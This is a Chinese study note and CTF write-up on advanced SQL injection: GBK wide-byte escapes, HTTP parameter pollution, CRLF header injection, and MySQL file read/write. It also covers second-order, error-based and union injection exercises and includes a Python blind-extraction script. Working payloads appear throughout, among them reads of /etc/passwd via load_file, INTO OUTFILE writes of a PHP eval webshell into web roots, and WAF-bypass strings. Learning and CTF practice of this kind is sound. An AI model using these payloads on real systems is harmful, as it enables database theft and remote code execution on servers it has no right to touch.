# 第六天：SQL注入高级绕过与文件操作

## 核心概念

第五天主要是盲注实战，今天的重点转向两个方向：一是**绕过手法的进阶**（宽字节注入、HTTP参数污染、HTTP分割绕过），二是**SQL注入的文件读写操作**。同时还做了两道综合练习——一道二次注入和一道带源码审计的联合注入。

绕过手法本质上是在对抗WAF或后端过滤。宽字节注入针对的是字符集层面的问题，HTTP参数污染利用的是多参数解析的歧义性，HTTP分割绕过则是利用HTTP协议本身的解析特性。

---

## 一、宽字节注入

### 原理

宽字节注入的根本原因是**数据库和PHP对字符编码的处理不一致**。

当数据库使用GBK编码时，一个中文字符占2个字节。PHP在连接数据库时如果设置了GBK编码，问题就来了。

正常情况下，PHP的`addslashes()`或`magic_quotes_gpc`会在单引号`'`前加一个反斜杠`\`进行转义：

```
'  -->  \'
```

`\`的十六进制是`0x5C`。如果攻击者在`'`前注入一个`%df`：

```
%df'  -->  %df\'  -->  %df%5C%27
```

而`%df%5C`在GBK编码中恰好是一个合法的中文字符（"運"），所以数据库会把`%df%5C`解析成一个汉字，后面的`%27`（即`'`）就**孤零零地暴露出来**了，逃逸成功。

简单说就是：**`%df`吃掉了`\`，两者组合成一个汉字，`'`就自由了**。

### 常见的宽字节组合

GBK编码范围是两字节，第一个字节范围是`0x81-0xFE`，第二个字节范围是`0x40-0xFE`。`\`的编码是`0x5C`，刚好落在第二个字节的合法范围内。

所以不止`%df`，很多字符都能吃掉`\`：

- `%df%5C` → "運"
- `%de%5C` → 另一个汉字
- `%dd%5C` → 另一个汉字

### 实战payload

假设后端代码：
```php
mysql_query("SET NAMES 'gbk'");
$name = addslashes($_GET['name']);
$sql = "SELECT * FROM users WHERE name = '$name'";
```

正常注入`' and 1=1--+`会被转义成`\' and 1=1--+`，`'`被转义了。

宽字节绕过：
```
name=%df' and 1=1--+
```

经过`addslashes()`后变成`%df\' and 1=1--+`，数据库用GBK解析时`%df%5C`被当作一个汉字，`'`逃逸。

### 完整注入流程（宽字节）

```
# 判断列数
?id=1%df' order by 3--+

# 判断回显位
?id=1%df' union select 1,2,3--+

# 获取数据库名
?id=1%df' union select 1,database(),3--+

# 获取表名
?id=1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

# 获取列名
?id=1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
```

### 宽字节注入的第二种形态

有些情况下，网站会先用`addslashes()`或`mysql_real_escape_string()`对参数进行转义，然后再用`iconv()`或`mb_convert_encoding()`做字符集转换（比如UTF-8转GBK）。在转换过程中也可能产生宽字节漏洞。

核心思路不变：**只要最终数据库的编码是多字节编码（GBK、GB2312、BIG5等），并且在编码转换或处理过程中有机会让某个多字节字符"吃掉"反斜杠，宽字节注入就成立。**

---

## 二、HTTP参数污染（HTTP Parameter Pollution）

### 原理

HTTP参数污染的核心在于：**在一个HTTP请求中传入多个同名参数，不同的服务器或中间件对同名参数的处理方式不同**。

举个例子，请求：
```
GET /search?q=select&q=union HTTP/1.1
```

不同的平台对这个请求的解析不一样：

| 平台/技术栈 | 解析结果 | 说明 |
|-----------|---------|------|
| PHP/Apache | `q=union` | 取最后一个参数值 |
| JSP/Tomcat | `q=select` | 取第一个参数值 |
| ASP.NET/IIS | `q=select,union` | 拼接所有值（逗号分隔） |
| Python Flask | `q=select` | 取第一个值 |
| Python Django | `q=union` | 取最后一个值 |

### WAF绕过场景

假设有一个WAF，它只检测第一个`q`参数，而后端取的是最后一个`q`参数：

```
GET /search?q=1 and 1=2&q=1 and 1=1 HTTP/1.1
```

WAF看到`q=1 and 1=2`，可能认为这是注入尝试并拦截。但如果后端（PHP）取的是最后一个参数`q=1 and 1=1`，而WAF解析的可能是第一个参数，这就产生了绕过。

更实际的场景是：
```
GET /search?q=clean_value&q=1' union select 1,2,3--+ HTTP/1.1
```

WAF检查`q=clean_value`觉得没问题放行，后端PHP取的是`q=1' union select 1,2,3--+`，注入成功。

### HPP在SQL注入中的应用

HPP还可以用来**绕过过滤规则**。比如后端有正则过滤：
```php
preg_match("/select|union|from/i", $_GET['q'])
```

但如果后端代码这样写：
```php
$q = $_GET['q'] . $_GET['q2'];
```

可以这样拆分关键字：
```
GET /search?q=se&q2=lect * from users HTTP/1.1
```

`q=se`和`q2=lect * from users`拼接后变成`select * from users`，绕过了对`select`关键字的检测。

### 防御方案

- 对同名参数的请求视为异常，直接拒绝
- 在代码层面显式指定取哪个参数（用索引访问而非取最后一个/第一个）
- WAF和后端采用相同的参数解析策略

---

## 三、HTTP分割绕过

### 原理

HTTP分割绕过（HTTP Parameter Splitting / HTTP Request Smuggling的一种变体）利用的是HTTP协议中换行符`%0d%0a`（CRLF）的特性。

在某些环境下，如果参数值中包含了换行符，服务器可能将其解析为HTTP头或新的请求行，从而实现**HTTP头注入**或**请求走私**。

### CRLF注入

如果后端直接把用户输入拼接到HTTP响应头中，且没有过滤换行符：

```php
header("Location: " . $_GET['url']);
```

攻击者可以注入：
```
url=http://example.com%0d%0aSet-Cookie:+session=evil
```

这会生成：
```
Location: http://example.com
Set-Cookie: session=evil
```

从而控制响应头。

### SQL注入中的分割绕过

有些WAF会检查整条请求。如果请求中的某个参数被分成多段传输（通过`%0d%0a`或者chunked encoding），WAF可能只检查了第一段，后面的恶意载荷就绕过去了。

在实际CTF中，这个技巧更多地用在**WAF绕过**和**SSRF**场景，SQL注入中相对少见，但原理相通——利用协议解析的差异来制造绕过。

---

## 四、SQL注入文件读写操作

### 前置条件

MySQL中的文件读写函数不是随时都能用的，需要同时满足三个条件：

1. **MySQL用户有FILE权限**（一般是root用户或GRANT过FILE权限的用户）
2. **`secure_file_priv`的值**允许在目标目录进行读写
   - 值为空：可以读写任意目录
   - 值为某个路径（如`/tmp/`）：只能在这个路径下读写
   - 值为NULL：禁止文件读写
3. **MySQL进程对目标目录有操作系统的读写权限**

可以用以下SQL查看`secure_file_priv`的状态：
```sql
show global variables like 'secure_file_priv';
```

### 读文件 — load_file()

语法：
```sql
load_file('文件的绝对路径')
```

**Linux示例：**
```sql
# 读/etc/passwd
?id=-1' union select 1,load_file('/etc/passwd'),3--+

# 读nginx配置文件
?id=-1' union select 1,load_file('/etc/nginx/nginx.conf'),3--+
```

**Windows示例：**
```sql
# 读Windows系统文件（路径中的反斜杠要写两个或者写成正斜杠）
?id=-1' union select 1,load_file('c:\\key.php'),3--+
?id=-1' union select 1,load_file('c:/key.php'),3--+
```

### 写文件 — INTO OUTFILE

语法：
```sql
SELECT '内容' INTO OUTFILE '绝对路径/文件名'
```

**写入webshell（Linux）：**
```sql
?id=-1' union select 1,'<?php @eval($_REQUEST["cmd"]);?>',3 into outfile '/var/www/html/shell.php'--+
```

**写入webshell（Windows + XAMPP）：**
```sql
?id=-1')) union select 1,"<?php @eval($_REQUEST['cmd']);?>",3 into outfile 'c:/xampp2/htdocs/shell1.php'--+
```

### INTO OUTFILE vs INTO DUMPFILE

| 特性 | INTO OUTFILE | INTO DUMPFILE |
|-----|-------------|---------------|
| 内容末尾 | 自动加换行符 | 原样写入 |
| 写入限制 | 单行 | 单行 |
| 多行写入 | 支持（自动换行） | 不支持 |

对于写入webshell来说，两种都可以用。但如果写入的是二进制文件或对格式有严格要求的内容，用DUMPFILE更合适。

### 获取绝对路径的常用方法

文件读写都需要知道网站的绝对路径。常用的获取方式：

1. **报错信息泄露**：构造SQL错误让数据库报出文件路径
2. **phpinfo页面**：如果有phpinfo页面，直接看`DOCUMENT_ROOT`
3. **数据库查询**：`select @@basedir`和`select @@datadir`获取数据库安装和数据目录
4. **常见路径字典**：
   - Linux: `/var/www/html`、`/var/www`、`/usr/share/nginx/html`
   - Windows + phpStudy: `c:/phpstudy_pro/WWW`
   - Windows + XAMPP: `c:/xampp/htdocs`
   - Windows + 宝塔: `c:/wwwroot`

---

## 五、实战练习一：二次注入

### 题目分析

这道题的核心是**二次注入（Second-order SQL Injection）**。

普通注入是"输入即执行"——恶意输入直接拼到SQL里当场执行。二次注入不同，它分两个步骤：
1. **存储阶段**：恶意数据先被安全地存入数据库（经过了转义或过滤）
2. **触发阶段**：后续某个操作从数据库取出这个数据，再拼到另一条SQL语句中执行

### 探测黑名单

先用Burp Intruder跑一遍关键字/符号的fuzz，筛选出那些没有被封禁的函数。我在这次练习中，发现`()`和空格都没有被过滤，所以**首选报错注入**（报错注入依赖`()`来绕过空格过滤）。

### 确认闭合方式

1. 访问`login.php`，输入admin和错误密码，提示错误——说明admin账号存在
2. 在`register.php`分别注册`admin'#`和`admin"#`两个账号
3. 分别登录这两个账号并修改密码
4. 发现用`admin"#`修改密码后，admin的密码被改了——说明**闭合方式是双引号`"`**，且存在二次注入

### 推理后端SQL逻辑

**注册时的SQL（数据被安全地存入）：**
```sql
INSERT INTO users (username, password, email) VALUES ('admin"#', '加密后的密码', 'test@example.com');
```

**修改密码时的SQL（恶意数据被取出后重新拼接，触发注入）：**
```sql
UPDATE users SET password = "new_password" WHERE username = "admin"#" AND password = "old_password";
```

`#`在SQL中是注释符，后面`AND password = "old_password"`全被注释掉了，所以直接修改了admin的密码。

### 获取数据库名

注册账号，username中嵌入报错注入payload：
```
username=1"||extractvalue(1,concat(0x7e,database()))#
```

注册时存入：
```sql
INSERT INTO users (username, password, email) VALUES ('1"||extractvalue(1,concat(0x7e,database()))#', '加密后密码', 'test@example.com');
```

登录后修改密码时触发：
```sql
UPDATE users SET password = "new_password" WHERE username = "1"||extractvalue(1,concat(0x7e,database()))#" AND password = "old_password";
```

报错回显：`~web_sqli`，数据库名为`web_sqli`。

### 获取表名

由于`()`、空格都能用，直接用报错注入的extractvalue句式：

```
username=1"||extractvalue(1,(select(group_concat(0x7e,table_name))from(information_schema.tables)where(table_schema)="web_sqli"))#
```

报错回显：`~article,~flag,~users`，三张表。

### 获取users表的列名

```
username=1"||extractvalue(1,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)="users")))#
```

extractvalue的报错信息最多显示32个字符，所以只能看到部分列名：`name,pwd,email,real_flag_1s_her`

后半部分被截断了。用`reverse()`函数把字符串倒过来再查：

```
username=1"||extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)="users"))))#
```

得到后半部分：`~ereh_s1_galf_laer,liame,dwp,ema`

拼接还原：`name,pwd,email,real_flag_1s_here`

### 获取flag

```
username=1"||extractvalue(1,(select(real_flag_1s_here)from(users)))#
```

报错：`Subquery returns more than 1 row`，说明users表中有多行，需要加条件限定。

空格被绕过了但`limit`关键字没被过滤——只是空格不能用，所以无法写`limit 0,1`。这里改用`regexp`正则匹配来逐行筛选：

```
username=1"||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f'))))#
```

通过正则匹配`^`（以某字符开头）逐字符定位flag。

---

## 六、实战练习二：Union注入 + 源码审计

### 信息收集

题目给了一段base32编码的提示：
```
MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5
```

base32解码后得到base64：
```
c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==
```

base64解码后得到SQL语句模板：
```sql
select * from user where username = '$name'
```

提示了单引号闭合。

### 闭合方式确认

```
123'       → 报错（SQL语法错误，说明单引号闭合成立）
123'#      → wrong user（语法正确但没有匹配用户）
```

确认为单引号闭合。

### 判断列数

```
name=123' union select 1,2,3#
```

确认返回3列。

### 源码泄露

通过扫描/猜测得到了后端源码片段，关键逻辑如下：

```php
$result = mysql_query($con, $sql);

if(preg_match("/\/(\|\)\|\=|or/", $name)){
    die("do not hack me!");
}
else{
    if (!$result) {
        printf("Error: %s\n", mysql_error($con));
        exit();
    }
    else{
        $arr = mysql_fetch_row($result);
        if($arr[1] == "admin") {
            if(md5($password) == $arr[2]){
                echo $flag;
            }
        } else{
            die("wrong pass!");
        }
    }
}
```

### 源码分析

这段代码的逻辑：
1. 正则过滤了`/`、`(`、`)`、`|`、`=`、`or`这些关键字
2. 查询结果中有3列（`mysql_fetch_row`返回索引数组）
3. `$arr[1]`是第二列，必须等于`"admin"`才进入密码校验
4. `$arr[2]`是第三列，`md5($password)`需要等于这一列的值

综合：
- 第1列：任意
- 第2列：填`admin`（username）
- 第3列：填一个我们自己知道的密码的MD5值

### 最终payload

```
name=123' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#
```

`e10adc3949ba59abbe56e057f20f883e`就是`123456`的MD5值。

然后POST中password填`123456`，`md5('123456')`和`$arr[2]`匹配，拿到flag。

### 绕过分析

这道题过滤了`/`、`(`、`)`、`|`、`=`、`or`，但：
- 我们的payload恰好不需要这些字符
- 注释符`#`没有被过滤
- `union`和`select`没有被过滤
- 单引号是闭合方式本身需要用到的，也没有被过滤

所以payload非常直接，不需要额外的绕过技巧。

---

## 七、盲注脚本实战

练习了一个用Python自动化盲注获取flag的脚本。题目场景是注册+登录的二次盲注：

### 核心思路

1. 注册时，username中嵌入盲注payload，payload用`ascii(substr())`逐字符提取flag
2. 登录后，页面用户名显示处会回显提取到的ASCII值
3. Python脚本遍历1到100个字符位置，每次用`ascii(substr((select * from flag) from N for 1))`取第N个字符的ASCII值
4. 将ASCII值转换回字符，拼接得到完整flag

### 关键payload结构

注册时的username：
```sql
0'+ascii(substr((select * from flag) from 1 for 1))+'0
```

SQL中`'0' + 数字 + '0'`的结果等于那个数字本身，所以页面上会显示ASCII值。

### Python实现

```python
import requests
from lxml import etree

register_url = 'https://xxx/register.php'
login_url = 'https://xxx/login.php'

flag = ""
for i in range(1, 100):
    register_data = {
        'email': 'aa{}@qq.com'.format(i),
        'username': "0'+ascii(substr((select * from flag) from {} for 1))+'0".format(i),
        'password': '123456'
    }
    res = requests.post(url=register_url, data=register_data)

    login_data = {
        'email': 'aa{}@qq.com'.format(i),
        'password': '123456'
    }
    res_ = requests.post(url=login_url, data=login_data)

    html = etree.HTML(res_.text)
    elements = html.xpath('//span[@class="user-name"]/text()')
    if elements:
        a = int(elements[0].strip())
        if 32 <= a <= 127:
            flag += chr(a)
        else:
            break

print(flag)
```

其中XPath路径`//span[@class="user-name"]`对应页面中显示用户名（即payload运算结果）的位置。

---

## 小结

第六天的内容涵盖了SQL注入的**绕过技术**和**扩展利用**两个维度：

| 技术 | 核心机制 | 适用场景 |
|-----|---------|---------|
| 宽字节注入 | GBK编码下`%df`吃掉`\`使单引号逃逸 | 数据库使用GBK/GB2312编码时 |
| HTTP参数污染 | 同名参数多平台解析不一致 | WAF与后端服务器的参数解析差异 |
| HTTP分割绕过 | CRLF换行符注入响应头 | HTTP头注入、WAF绕过 |
| 文件读写 | load_file() / INTO OUTFILE | 有FILE权限 + secure_file_priv允许 |

另外，这两道CTF练习覆盖了之前学过的核心技术：
- **二次注入**：数据先存储后触发，本质上是报错注入（extractvalue）的二次应用
- **Union注入+源码审计**：经典的信息收集到源码分析的全流程，正则过滤的绕过相对简单

比起第四天第五天的系统化注入方法论，第六天的内容更偏向**实战中会遇到的具体场景**——不同的绕过手法对应不同的环境限制，文件读写是注入的延伸利用。在实际渗透中，这些技巧往往是组合使用的。
